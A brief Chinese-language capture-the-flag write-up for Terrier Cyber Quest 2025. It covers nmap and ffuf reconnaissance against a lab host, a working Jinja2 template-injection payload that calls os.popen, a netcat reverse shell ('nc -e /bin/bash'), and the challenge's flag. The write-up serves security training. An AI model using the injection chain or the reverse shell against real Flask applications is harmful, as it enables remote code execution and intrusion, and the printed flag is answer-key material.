---
title: Terrier Cyber Quest 2025 — 简要 Write-up
contest: Terrier Cyber Quest
year: 2025
difficulty: easy
vuln_type: web_unknown
tags: [jinja2-ssti, nmap-scan, ffuf-fuzz, class-chain-os-popen, base58-flag]
attack_chain:
- sudo nmap -sC 192.168.57.24 -A -v -p- 扫描端口
- ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u http://192.168.57.24:5000/FUZZ -fs 3806
- Flask 5000 端口发现路由
- Jinja2 SSTI: {{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nc -e /bin/bash IP PORT').read()}}
- 反弹 shell
- flag: 22gSOqdlldjDbbIxZ4NPAeodlIvKmMGjj3ZTw9D5fXc1ffsERpc7CznmEVd1BhfbqbQaIJ5s4
key_payload: {{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('...').read()}}
one_liner: Terrier Cyber Quest 2025：nmap+ffuf 探测 + Flask Jinja2 SSTI 反弹 shell。
lesson: 经典的 ''.__class__.__mro__[1].__subclasses__()[N] 找 subprocess.Popen / os._wrap_close 触发 RCE。
quality: medium
---
# Terrier Cyber Quest 2025 — 简要 Write-up

## 攻击步骤

### 1. 端口扫描
```bash
sudo nmap -sC 192.168.57.24 -A -v -p-
```

### 2. 目录扫描
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
     -u http://192.168.57.24:5000/FUZZ \
     -fs 3806
```

### 3. Flask Jinja2 SSTI RCE
```python
{{''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('nc -e /bin/bash IP PORT').read()}}
```
- `str.__class__.__mro__[1]` → `<class 'object'>`
- `object.__subclasses__()[104]` → `subprocess.Popen` 或 `os._wrap_close` (依 Python 版本)
- `__init__.__globals__['sys'].modules['os'].popen('...')` 触发命令执行

### 4. 反弹 shell
- `nc -e /bin/bash IP PORT`

### 5. flag
```
22gSOqdlldjDbbIxZ4NPAeodlIvKmMGjj3ZTw9D5fXc1ffsERpc7CznmEVd1BhfbqbQaIJ5s4
```

## 实战要点
- 网络扫描 → 端口识别 → 服务指纹 → 路径 fuzz
- 模板注入点：用户输入直接拼到 `render_template_string` 即 RCE
- 反弹 shell 时防火墙注意出站策略
